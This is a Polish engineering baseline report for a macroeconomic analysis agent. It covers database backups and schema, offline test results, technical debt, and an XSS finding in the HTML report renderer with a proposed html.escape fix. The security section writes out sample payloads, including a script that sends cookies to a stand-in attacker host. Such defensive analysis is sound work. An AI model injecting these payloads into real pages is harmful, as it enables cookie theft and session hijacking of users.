# Dokumentacja Stanu Początkowego (Safety Baseline)

**Data sporządzenia:** 2026-11-02  
**Projekt:** Autonomiczny System Analizy Makroekonomicznej (`polish-economy-agent`)  
**Branch bazowy:** `main` (commit bazowy: `d4aad2d576b624da297e7ee9d565eac2a7439043`)  
**Branch refaktoryzacji:** `refactor/01-safety-baseline`  

---

## 1. Cel Raportu

Celem niniejszego dokumentu jest zarejestrowanie i zamrożenie stanu wyjściowego aplikacji przed przystąpieniem do dalszych prac refaktoryzacyjnych (Tavily, Gemini, GPT, API). Dokument potwierdza:
1. Integralność i statystyki istniejącej bazy danych SQLite (`instance/economy_agent.db`).
2. Wykonanie i zabezpieczenie kopii zapasowej poza strukturą repozytorium Git.
3. Pokrycie kluczowych mechanizmów automatycznymi testami regresyjnymi w `pytest` działającymi w 100% offline.
4. Identyfikację podatności bezpieczeństwa w module prezentacji HTML wraz z propozycją minimalnej poprawki.
5. Inwentaryzację długu technologicznego i znanych ograniczeń architektonicznych.

---

## 2. Kopia Bezpieczeństwa Bazy Danych

Przed przystąpieniem do jakichkolwiek działań wykonano fizyczną kopię bazy danych poza repozytorium Git:
- **Ścieżka backupu 1 (lokalny dysk deweloperski):** `E:\Programy\PycharmProjects\polish-economy-agent-backups\economy_agent_baseline_backup.db`
- **Ścieżka backupu 2 (magazyn artefaktów agenta):** `C:\Users\Admin\.gemini\antigravity-acp\brain\5d356816-ca32-41f1-a89c-874c58f163e2\economy_agent_baseline_backup.db`
- **Rozmiar pliku bazowego:** 73 728 bajtów (72 KB)
- **Status oryginalnego pliku `instance/economy_agent.db`:** Nienaruszony (brak modyfikacji, testy używają wyłącznie izolowanych instancji tymczasowych `tmp_path` lub połączeń w trybie odczytu `file:instance/economy_agent.db?mode=ro`).

---

## 3. Stan Bazowy i Statystyki Bazy Danych

Weryfikacja bazy `instance/economy_agent.db` w trybie wyłącznie do odczytu potwierdziła następujące liczby rekordów:

| Tabela | Wymagana liczba rekordów | Rzeczywista liczba rekordów | Status weryfikacji |
|---|---|---|---|
| `collected_indicators` | **75** | **75** | ZGODNY |
| `trusted_sources` | **10** | **10** | ZGODNY |
| `generated_reports` | **6** | **6** | ZGODNY |

### 3.1. Schemat Bazy SQLite

Struktura tabel w `instance/economy_agent.db`:

#### `trusted_sources`
```sql
CREATE TABLE trusted_sources (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_name TEXT,
    country TEXT,
    name TEXT,
    url TEXT,
    description TEXT,
    created_at TIMESTAMP
);
```

#### `collected_indicators`
```sql
CREATE TABLE collected_indicators (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_name TEXT,
    country TEXT,
    indicator_name TEXT,
    value TEXT,
    period TEXT,
    source_name TEXT,
    page_info TEXT,
    created_at TIMESTAMP,
    previous_value TEXT DEFAULT 'Brak danych',
    trend_direction TEXT DEFAULT 'brak danych'
);
```
*Uwaga:* Kolumny `previous_value` i `trend_direction` zostały dodane w drodze samoczynnej migracji w `EconomyDatabase.init_db()`.

#### `generated_reports`
```sql
CREATE TABLE generated_reports (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    country TEXT,
    report_date TEXT,
    periods_summary TEXT,
    content_markdown TEXT,
    created_at TIMESTAMP
);
```

#### `sqlite_sequence`
Tabela systemowa przechowująca sekwencje autoincrement:
- `trusted_sources`: seq = 10
- `collected_indicators`: seq = 75
- `generated_reports`: seq = 6

---

### 3.2. Szczegółowy Rozkład Danych w Stanie Początkowym

#### Podział wskaźników według agentów zbierających (`collected_indicators`):
- **GPTAgent:** 42 rekordy (zakres czasu: `2026-09-18T11:58:10` – `2026-09-18T12:56:52`)
- **GeminiAgent:** 33 rekordy (zakres czasu: `2026-09-18T12:01:51` – `2026-09-18T12:56:48`)
- **Kraj:** Wszystkie 75 rekordów przypisanych jest do kraju: `Polska`.

#### Zaufane źródła (`trusted_sources`):
Dokładnie 10 oficjalnych instytucji skonfigurowanych przez agenta `PolishEconomyAgent`:
1. Główny Urząd Statystyczny (GUS) – `https://stat.gov.pl`
2. Narodowy Bank Polski (NBP) – `https://www.nbp.pl`
3. Ministerstwo Finansów – `https://www.gov.pl/web/finanse`
4. Eurostat – `https://ec.europa.eu/eurostat`
5. Międzynarodowy Fundusz Walutowy (IMF) – `https://www.imf.org`
6. OECD – `https://www.oecd.org`
7. Komisja Europejska – `https://ec.europa.eu`
8. Bank Światowy – `https://www.worldbank.org`
9. Polski Instytut Ekonomiczny (PIE) – `https://pie.net.pl`
10. Giełda Papierów Wartościowych w Warszawie (GPW) – `https://www.gpw.pl`

#### Wygenerowane raporty (`generated_reports`):
6 raportów archiwalnych dla Polski z dnia `18.09.2026` o wielkościach treści markdown od 3 614 do 5 532 znaków.

---

## 4. Wyniki Testów Automatycznych Offline (pytest)

Zgodnie z wymaganiami zadania utworzono zestaw 43 testów regresyjnych, niewymagających dostępu do sieci internetowej ani zewnętrznych kluczy API (mockowane zmienne środowiskowe, izolacja bazy poprzez `tmp_path`).

### Podsumowanie wykonania testów

```text
============================= test session starts =============================
platform win32 -- Python 3.11.16, pytest-9.2.0, pluggy-1.7.0
rootdir: polish-economy-agent
collected 43 items

tests/test_database_init.py .....                                        [ 11%]
tests/test_indicators_storage.py ......                                  [ 25%]
tests/test_record_updates.py .....                                       [ 37%]
tests/test_ambiguous_formats.py .....                                    [ 48%]
tests/test_cache_freshness.py ......                                     [ 62%]
tests/test_executive_horizon.py ........                                 [ 81%]
tests/test_html_security.py ........                                     [100%]

============================== 43 passed in 1.45s ==============================
```

### Obszary pokryte testami:
1. **`test_database_init.py` (5 testów):**
   - Poprawne tworzenie tabel: `trusted_sources`, `collected_indicators`, `generated_reports`.
   - Zgodność schematu kolumn oraz wartości domyślnych (`previous_value='Brak danych'`, `trend_direction='brak danych'`).
   - Idempotencja metody `init_db()` przy wielokrotnym wywołaniu.
   - Działanie automatycznej migracji (`ALTER TABLE`) przy wstępnym braku nowych kolumn.
   - Nienaruszalność bazowego stanu bazy `instance/economy_agent.db` (75 / 10 / 6).
2. **`test_indicators_storage.py` (6 testów):**
   - Zapisywanie wskaźników przez `save_indicators` i ich weryfikacja w SQLite.
   - Odczyt wskaźników przez `EconomyEvaluator.fetch_timeline_data(country)`.
   - Domyślne wartości przy zapisie obiektów o niepełnym zbiorze atrybutów.
   - Zapis i odczyt zaufanych źródeł (`save_sources`, `get_sources`).
   - Zachowanie kasujące przy ponownym zapisie źródeł dla danego kraju/agenta.
   - Zapis i odczyt najnowszego raportu (`save_generated_report`, `get_latest_report`).
3. **`test_record_updates.py` (5 testów):**
   - Prawidłowa aktualizacja wiersza `UPDATE` w miejscu, gdy klucz `(agent_name, country, indicator_name, period)` jest identyczny (liczba wierszy nie ulega zmianie).
   - Tworzenie odrębnych wpisów dla różnych agentów (`GeminiAgent` vs `GPTAgent`).
   - Wrażliwość na wielkość liter w `indicator_name` (np. `"Przeciętne Wynagrodzenia"` vs `"Przeciętne wynagrodzenia"` tworzy 2 wpisy).
   - Wrażliwość na różnice w formatowaniu okresu (np. `"VII 2026"` vs `"lipiec 2026"` tworzy 2 wpisy).
   - Zachowanie `fetchone()` w obecności duplikatów: aktualizowany jest wyłącznie pierwszy dopasowany rekord, kolejny pozostaje przeterminowany.
4. **`test_ambiguous_formats.py` (5 testów):**
   - Niejednoznaczność liczb rzymskich: `"II 2026"` jest interpretowane jako luty, a `"II kw. 2026"` jako II kwartał.
   - Niejednoznaczność `"IV 2026"` (kwiecień vs IV kwartał).
   - Niejednoznaczność separatorów w datach (`"05.06.2026"`: regex dopasowuje pierwszą liczbę `<= 12`, wybierając maj zamiast 5 czerwca).
   - Ignorowanie okresów pozbawionych 4-cyfrowego roku (`"lipiec"`, `"II kw."`).
   - Dokumentacja wariantów nazw wskaźników w bazie (np. 3 wersje inflacji bazowej).
5. **`test_cache_freshness.py` (6 testów):**
   - Pusta baza -> `are_indicators_fresh() == False`.
   - Dane tylko od jednego agenta (`GeminiAgent` lub `GPTAgent`) -> `False`.
   - Świeże dane od obu agentów w oknie `max_days` -> `True`.
   - Dane przeterminowane (starsze niż `max_days`) -> `False`.
   - Izolacja według kraju (świeże dane dla Niemiec nie dają świeżości dla Polski).
   - Odporność na uszkodzone sygnatury czasowe ISO w `created_at` (bezpieczne zwrócenie `False` zamiast wyjątku).
6. **`test_executive_horizon.py` (8 testów):**
   - Puste i brakujące dane -> zwrot frazy domyślnej `"Bieżące odczyty GUS i NBP"`.
   - Pojedynczy miesiąc -> format `"Lipiec 2026 (dane miesięczne)"`.
   - Wiele miesięcy -> format przedziału `"Czerwiec – lipiec 2026 (wskaźniki miesięczne)"`.
   - Mapowanie liczb rzymskich na polskie nazwy miesięcy.
   - Wykrywanie kwartałów z etykietą `(PKB)`.
   - Generowanie sekcji `baza odniesienia: [lata] r.` dla lat wcześniejszych.
   - Pełna integracja złożonego horyzontu ze znakiem potoku ` | `.
   - Integracja z rzeczywistymi okresami z bazy bazowej.
7. **`test_html_security.py` (8 testów):**
   - Dowód podatności XSS w istniejącym `format_report_html` (przepuszczanie surowych tagów `<script>`, `<img>` z `onerror`, `<iframe>`, `<style>`).
   - Dowód podatności w parametrze `country` w szablonie `build_html_template`.
   - Potwierdzenie skuteczności proponowanej minimalnej poprawki sanityzującej `html.escape`.
   - Potwierdzenie zachowania poprawnego renderowania nagłówków Markdown, pogrubień, przypisów numerycznych i linków `https://`.

---

## 5. Analiza Bezpieczeństwa Renderowania HTML i Propozycja Minimalnej Poprawki

### 5.1. Opis Podatności (Stored / Reflected XSS)

W pliku `app.py`:
- Funkcja `format_report_html(text: str)` wykonuje bezpośrednie zastąpienia wyrażeniami regularnymi (`re.sub`) na surowym tekście bez jakiejkolwiek uprzedniej sanityzacji ani ucieczki encji HTML (`html.escape` lub `markupsafe`).
- Funkcja `build_html_template(report_text: str, country: str)` interpoluje sformatowany ciąg oraz surowy parametr `country` bezpośrednio w f-stringu HTML:
  ```python
  <div class="report-content">{formatted_content}</div>
  <div class="footer">Raport wygenerowany dla kraju: {country}</div>
  ```

#### Wektory ataku:
1. **Wstrzyknięcie złośliwej treści przez odpowiedź LLM lub skażone źródła internetowe:**
   Jeżeli artykuł pobrany przez wyszukiwarkę lub wygenerowany tekst LLM zawiera np. `<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>` bądź `<img src=x onerror=alert(1)>`, kod ten trafia bez zmian do przeglądarki użytkownika i zostaje wykonany.
2. **Wstrzyknięcie w parametrze kraju (`country`):**
   Przekazanie wartości `Polska<script>alert(1)</script>` powoduje osadzenie skryptu w znacznikach `<title>` oraz `<div class="footer">`.
3. **Konflikt wyrażeń regularnych w linkach:**
   Próba wstrzyknięcia tagu `<iframe src="https://attacker.com/evil">` powoduje, że wyrażenie regularne linków zamienia adres wewnątrz atrybutu `src` na zagnieżdżony tag `<a>`, co powoduje błędy parsowania drzewa DOM.

---

### 5.2. Proponowana Minimalna Poprawka

Minimalna, w 100% bezpieczna poprawka wymaga dodania standardowego modułu `import html` z biblioteki standardowej Pythona i wykonania ucieczki encji HTML przed aplikowaniem reguł Markdown.

#### Proponowany Diff dla `app.py`:

```diff
--- a/app.py
+++ b/app.py
@@ -1,4 +1,5 @@
 import datetime
+import html
 import os
 import re
 import config
@@ -18,6 +19,9 @@ def format_report_html(text: str) -> str:
   if not text:
     return ""
 
+  # Krok 1: Sanityzacja znaków specjalnych HTML (ochrona przed XSS)
+  text = html.escape(text, quote=True)
+
   text = re.sub(r"^###\s+(.+)$", r"<h3>\1</h3>", text, flags=re.MULTILINE)
   text = re.sub(r"^##\s+(.+)$", r"<h2>\1</h2>", text, flags=re.MULTILINE)
   text = re.sub(r"^#\s+(.+)$", r"<h1>\1</h1>", text, flags=re.MULTILINE)
@@ -42,7 +46,8 @@ def format_report_html(text: str) -> str:
 
 
 def build_html_template(report_text: str, country: str) -> str:
+  safe_country = html.escape(country, quote=True)
   formatted_content = format_report_html(report_text)
   return f"""<!DOCTYPE html>
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
-    <title>Raport Kondycji Gospodarczej: {country}</title>
+    <title>Raport Kondycji Gospodarczej: {safe_country}</title>
     <style>
 ...
         <div class="report-content">{formatted_content}</div>
         <div class="footer">
-            Raport wygenerowany dla kraju: {country}
+            Raport wygenerowany dla kraju: {safe_country}
         </div>
     </div>
 </body>
```

Poprawka została przetestowana w `tests/test_html_security.py` i skutecznie eliminuje wszystkie wektory ataków XSS bez zakłócania legalnego formatowania Markdown, przypisów numerycznych `[1]` oraz odnośników URL `https://`.

---

## 6. Znane Ograniczenia i Dług Technologiczny (Known Limitations)

W trakcie analizy bazowej zidentyfikowano następujące kwestie architektoniczne, które należy zaadresować w kolejnych etapach refaktoryzacji:

1. **Wymuszenie obecności kluczy API podczas importu (`config.py`):**
   - Plik `config.py` sprawdza obecność `GOOGLE_API_KEY`, `OPENAI_API_KEY` i `TAVILY_API_KEY` bezpośrednio na poziomie modułu (`import time`).
   - Brak klucza rzuca `ValueError` i uniemożliwia import jakiegokolwiek pliku zależnego (np. `evaluator.py`, `sources.py`, `data_fetcher.py`).
   - W testach zastosowano atrapę środowiskową (`conftest.py`), jednak docelowo `config.py` powinien umożliwiać leniwą walidację (lazy validation) lub konfigurację wstrzykiwaną (dependency injection).

2. **Brak unikalnych ograniczeń (UNIQUE constraints) w bazie SQLite:**
   - Tabela `collected_indicators` nie posiada indeksu unikalnego na `(agent_name, country, indicator_name, period)`.
   - Logika sprawdzania duplikatów opiera się wyłącznie na aplikacji (`SELECT id FROM collected_indicators ... LIMIT 1`).
   - W przypadku wystąpienia duplikatów w bazie (np. z równoległych przebiegów), `fetchone()` aktualizuje wyłącznie pierwszy rekord, a pozostałe kopie pozostają trwale przeterminowane.

3. **Brak normalizacji nazw wskaźników:**
   - Wskaźniki są zapisywane literalnie tak, jak wyekstrahuje je LLM.
   - W bazie bazowej istnieją jednocześnie trzy warianty tego samego wskaźnika:
     - `Inflacja bazowa (po wyłączeniu cen żywności i energii)`
     - `Inflacja bazowa (wyłączenie cen żywności i energii)`
     - `Inflacja bazowa (z wyłączeniem cen żywności i energii)`
   - Występują również różnice w wielkości liter: `Przeciętne Wynagrodzenia` vs `Przeciętne wynagrodzenia`.
   - Skutkuje to brakiem ciągłości historii szeregów czasowych przy generowaniu osi czasu.

4. **Niejednoznaczność i ograniczenia parsera okresów (`build_executive_horizon`):**
   - Brak mapowania cyfr arabskich na rzymskie dla kwartałów: format `q3 kwartał 2026` jest formatowany jako `3 kw. 2026 (PKB)` zamiast `III kw. 2026 (PKB)`.
   - Oznaczenia rzymskie bez słowa "kw." (np. `II 2026`, `IV 2026`) są błędnie interpretowane jako miesiące (luty, kwiecień), a nie kwartały.
   - Wyrażenie regularne dla formatów numerycznych z kropkami lub ukośnikami (`05.06.2026`) parsuje pierwszą cyfrę `<= 12` jako miesiąc, co w polskim formacie DD.MM.YYYY prowadzi do zamiany dnia z miesiącem.
   - Okresy bez podanego 4-cyfrowego roku są całkowicie pomijane.

5. **Współbieżność SQLite:**
   - Połączenia do bazy SQLite są otwierane i zamykane w każdej metodzie bez mechanizmu puli połączeń (connection pool) ani transakcji z blokowaniem zapisu (`WAL mode`), co grozi błędami `database is locked` przy równoległym uruchomieniu agentów.
